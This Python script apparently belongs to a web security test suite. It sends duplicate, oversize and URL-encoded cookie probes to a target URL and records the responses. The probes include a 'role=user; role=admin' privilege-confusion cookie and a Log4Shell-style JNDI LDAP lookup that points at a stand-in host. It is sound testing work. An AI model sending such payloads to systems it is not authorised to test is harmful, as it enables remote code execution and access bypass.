#!/usr/bin/env python3
from __future__ import annotations

import argparse

from http_probe_common import curl_request, dump_json, ensure_dir, write_csv


def main() -> int:
    parser = argparse.ArgumentParser(description="Run TC-21 duplicate and oversize cookie probes.")
    parser.add_argument("--url", required=True)
    parser.add_argument("--output-dir", required=True)
    parser.add_argument("--timeout", type=int, default=15)
    parser.add_argument("--pad-size", type=int, default=4096)
    args = parser.parse_args()

    out_dir = ensure_dir(args.output_dir)
    pad = "B" * args.pad_size
    cases = [
        ("single_cookie", [("Cookie", "role=user")]),
        ("duplicate_cookie", [("Cookie", "role=user; role=admin")]),
        ("oversize_cookie", [("Cookie", f"session=AAA; pad={pad}; exploit=tc21-probe")]),
        ("url_encoded_cookie", [("Cookie", "q=%24%7Bjndi%3Aldap%3A%2F%2Fprobe.invalid%2Fa%7D")]),
    ]

    rows: list[dict[str, str]] = []
    summary = {"url": args.url, "cases": []}
    for name, header_pairs in cases:
        result = curl_request(
            url=args.url,
            out_prefix=out_dir / name,
            headers=[f"{key}: {value}" for key, value in header_pairs],
            timeout=args.timeout,
        )
        metadata = {
            "case": name,
            "cookie_header": header_pairs[0][1],
            "cookie_length": len(header_pairs[0][1]),
            "result": result,
        }
        dump_json(out_dir / f"{name}.meta.json", metadata)
        summary["cases"].append(metadata)
        rows.append(
            {
                "case": name,
                "cookie_length": str(metadata["cookie_length"]),
                "http_code": result["http_code"],
                "server_header": result["server_header"],
                "body_fingerprint": result["body_fingerprint"],
                "header_path": result["header_path"],
                "body_path": result["body_path"],
            }
        )

    dump_json(out_dir / "summary.json", summary)
    write_csv(
        out_dir / "summary.csv",
        ["case", "cookie_length", "http_code", "server_header", "body_fingerprint", "header_path", "body_path"],
        rows,
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
